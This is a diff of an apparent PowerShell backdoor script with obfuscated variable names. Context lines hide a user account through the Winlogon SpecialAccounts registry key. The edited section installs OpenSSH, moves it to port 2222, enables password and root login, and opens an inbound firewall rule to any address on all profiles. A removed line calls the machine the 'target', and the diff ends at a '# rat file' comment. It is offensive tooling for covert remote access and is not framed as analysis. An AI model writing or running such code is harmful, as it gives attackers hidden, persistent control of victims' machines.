@@ -33,81 +33,58 @@ $jmQikqoKMZ = '00000000'
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name SpecialAccounts -Force
 New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts' -Name UserList -Force
 New-ItemProperty -Path $csfMFzvgEN -Name $sqbXFdLvyw -Value $jmQikqoKMZ -PropertyType DWORD -Force
-# =============== SSH SECTION - ALTERNATIVE METHOD ===============
-# Check if SSH is already installed
-$sshInstalled = Get-WindowsCapability -Online | Where-Object {$_.Name -like "*OpenSSH.Server*"}
+# =============== SSH SECTION - PORT 2222 ===============
+# ssh installation
+Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 
-if (-not $sshInstalled -or $sshInstalled.State -ne "Installed") {
-    Write-Host "[*] Installing OpenSSH Server..." -ForegroundColor Yellow
+# Start SSH service
+Start-Service sshd
+Set-Service -Name sshd -StartupType 'Automatic'
+
+# Change SSH port to 2222 in config file
+$sshdConfig = "C:\ProgramData\ssh\sshd_config"
+if (Test-Path $sshdConfig) {
+    # Backup original config
+    Copy-Item $sshdConfig "$sshdConfig.backup" -Force
     
-    # METHOD 1: Try Windows Capability (might fail on Home edition)
-    try {
-        Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 -ErrorAction Stop
-        Write-Host "[+] OpenSSH installed via Windows Capability" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Windows Capability failed, trying manual install..." -ForegroundColor Red
-        
-        # METHOD 2: Manual installation from GitHub
-        $url = "https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win64.zip"
-        $zipPath = "$env:TEMP\OpenSSH-Win64.zip"
-        $installPath = "C:\Program Files\OpenSSH"
-        
-        # Download and extract OpenSSH
-        Invoke-WebRequest -Uri $url -OutFile $zipPath
-        Expand-Archive -Path $zipPath -DestinationPath $installPath -Force
-        
-        # Install SSH
-        Set-Location "$installPath"
-        .\install-sshd.ps1
-        
-        Remove-Item $zipPath -Force
-        Write-Host "[+] OpenSSH installed manually from GitHub" -ForegroundColor Green
-    }
+    # Change port to 2222
+    $configContent = Get-Content $sshdConfig
+    $configContent = $configContent -replace '#Port 22', 'Port 2222'
+    $configContent = $configContent -replace 'Port 22', 'Port 2222'
+    $configContent | Set-Content $sshdConfig
+    
+    # Ensure password auth is enabled
+    $configContent = $configContent -replace '#PasswordAuthentication yes', 'PasswordAuthentication yes'
+    $configContent = $configContent -replace 'PasswordAuthentication no', 'PasswordAuthentication yes'
+    $configContent | Set-Content $sshdConfig
+} else {
+    # Create config if missing
+    @"
+Port 2222
+PasswordAuthentication yes
+PermitRootLogin yes
+"@ | Out-File $sshdConfig -Encoding ASCII
 }
 
-# Configure and start SSH service
-try {
-    # Start SSH service
-    Start-Service sshd -ErrorAction Stop
-    Set-Service -Name sshd -StartupType 'Automatic'
-    
-    # Configure SSH to allow password authentication
-    $sshdConfig = "C:\ProgramData\ssh\sshd_config"
-    if (Test-Path $sshdConfig) {
-        (Get-Content $sshdConfig) -replace '#PasswordAuthentication yes', 'PasswordAuthentication yes' | Set-Content $sshdConfig
-        (Get-Content $sshdConfig) -replace 'PasswordAuthentication no', 'PasswordAuthentication yes' | Set-Content $sshdConfig
-    }
-    
-    # FIREWALL RULES
-    Remove-NetFirewallRule -Name "SSH-Allow-All" -ErrorAction SilentlyContinue
-    
-    New-NetFirewallRule -Name "SSH-Allow-All" `
-      -DisplayName "SSH Allow All Inbound" `
-      -Enabled True `
-      -Direction Inbound `
-      -Protocol TCP `
-      -LocalPort any `
-      -RemoteAddress Any `
-      -Profile Any `
-      -Action Allow
-    
-    # Restart SSH service
-    Restart-Service sshd -Force
-    
-    # Test SSH locally
-    Start-Sleep -Seconds 3
-    Write-Host "[*] Testing SSH service..." -ForegroundColor Yellow
-    $testResult = Test-NetConnection -ComputerName localhost -Port 22 -WarningAction SilentlyContinue
-    if ($testResult.TcpTestSucceeded) {
-        Write-Host "[+] SSH is running on port 22" -ForegroundColor Green
-    } else {
-        Write-Host "[!] SSH test failed. Manual check required." -ForegroundColor Red
-    }
-    
-} catch {
-    Write-Host "[!] SSH configuration failed: $_" -ForegroundColor Red
-    Write-Host "[!] Manual SSH setup required on target." -ForegroundColor Red
-}
+# FIREWALL RULES for PORT 2222
+Remove-NetFirewallRule -Name "SSH-2222-Allow" -ErrorAction SilentlyContinue
+
+New-NetFirewallRule -Name "SSH-2222-Allow" `
+  -DisplayName "SSH Port 2222 Allow" `
+  -Enabled True `
+  -Direction Inbound `
+  -Protocol TCP `
+  -LocalPort 2222 `
+  -RemoteAddress Any `
+  -Profile Domain,Private,Public `
+  -Action Allow
+
+# Restart SSH to apply port change
+Restart-Service sshd -Force
+
+# Test new port
+Start-Sleep -Seconds 2
+Test-NetConnection -ComputerName localhost -Port 2222
 # =============== END SSH SECTION ===============
 
 # rat file
